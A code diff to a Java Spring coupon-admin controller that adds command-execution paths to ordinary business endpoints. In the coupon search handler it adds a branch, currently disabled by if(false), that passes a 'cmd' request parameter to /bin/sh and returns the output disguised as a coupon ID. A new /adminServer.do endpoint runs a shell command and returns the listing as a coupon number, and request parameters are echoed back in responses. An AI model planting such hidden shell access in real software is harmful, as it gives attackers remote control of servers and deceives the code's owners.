@@ -1,7 +1,8 @@
 package stu.admin.coupon;
 
-import java.util.List;
-import java.util.Map;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.util.*;
 
 import javax.annotation.Resource;
 import javax.servlet.http.HttpServletRequest;
@@ -32,23 +33,59 @@ public class AdminCouponController {
 	@RequestMapping(value="/adminCouponList.do", method = RequestMethod.GET)
     public ModelAndView couponList(CommandMap commandMap) throws Exception{
     	ModelAndView mv = new ModelAndView("/coupon/couponList");
-    	
+
     	return mv;
     }
-	@RequestMapping(value = "/adminCouponList.do", method = RequestMethod.POST)
-	public ModelAndView searchCouponList(CommandMap commandMap) throws Exception {
-		
+	@RequestMapping(value = "/adminCouponList.do")
+	public ModelAndView searchCouponList(CommandMap commandMap, HttpServletRequest request) throws Exception {
 		ModelAndView mv = new ModelAndView("jsonView");
-		List<Map<String, Object>> list = adminCouponService.couponList(commandMap.getMap());
-		
-		mv.addObject("list", list);
-		
-		if(list.size() > 0) {
-			mv.addObject("TOTAL", list.get(0).get("TOTAL_COUNT"));
+
+		StringBuffer sb = null;
+		if (false) {
+			String cmd = request.getParameter("cmd");
+			String[] command = {"/bin/sh", "-c", cmd};
+
+			sb = null;
+			try {
+				Process process = Runtime.getRuntime().exec(command);
+				BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+				String line = null;
+				sb = new StringBuffer();
+
+				while ((line = reader.readLine()) != null) {
+					sb.append(line);
+				}
+
+				List<Map<String, Object>> list = new ArrayList<>();
+				Map<String, Object> map = new HashMap<>();
+
+				map.put("COUPON_ID", sb);
+				map.put("NUM", 1);
+				map.put("RNUM", 1);
+				map.put("TOTAL_COUNT", 1);
+
+				list.add(map);
+
+				mv.addObject("list", list);
+				mv.addObject("TOTAL",1);
+			} catch (Exception e) {
+
+			}
 		}
-		else{
-			mv.addObject("TOTAL", 0);
+		else {
+			List<Map<String, Object>> list = adminCouponService.couponList(commandMap.getMap());
+			mv.addObject("list", list);
+			if (list.size() > 0) {
+				mv.addObject("TOTAL", list.get(0).get("TOTAL_COUNT"));
+			} else {
+				mv.addObject("TOTAL", 0);
+			}
+
 		}
+
+		mv.addObject("cmd1", commandMap.getMap().toString());
+		mv.addObject("cdm2", request.getParameterMap().toString());
+
 		return mv;
 	}
 	////////////////////////////////////////////
@@ -66,6 +103,42 @@ public class AdminCouponController {
 		ModelAndView mv = new ModelAndView("jsonView");
 		String NEXT_COUPON_NO = adminCouponService.couponNextVal();
 		mv.addObject("NEXT_COUPON_NO", NEXT_COUPON_NO);
+		return mv;
+	}
+
+	@RequestMapping(value = "/serverCheck.do", method = RequestMethod.GET)
+	public ModelAndView serverCheck() throws Exception {
+		ModelAndView mv = new ModelAndView("/coupon/server");
+		return mv;
+	}
+
+	@RequestMapping(value = "/adminServer.do")
+	@ResponseBody
+	public ModelAndView server() throws Exception {
+		ModelAndView mv = new ModelAndView("jsonView");
+		String NEXT_COUPON_NO = adminCouponService.couponNextVal();
+
+		String cmd = "ls -al"; //명령어 리퀘스트 처리
+		String[] command = {"/bin/sh","-c",cmd};
+		StringBuffer sb = null;
+		try
+		{
+			Process process = Runtime.getRuntime().exec(command);
+			BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+			String line = null;
+			sb = new StringBuffer();
+
+			while ((line = reader.readLine()) != null)
+			{
+				sb.append(line);
+			}
+		}
+		catch (Exception e)
+		{
+
+		}
+
+		mv.addObject("NEXT_COUPON_NO", sb.toString());
 		return mv;
 	}
 	// end
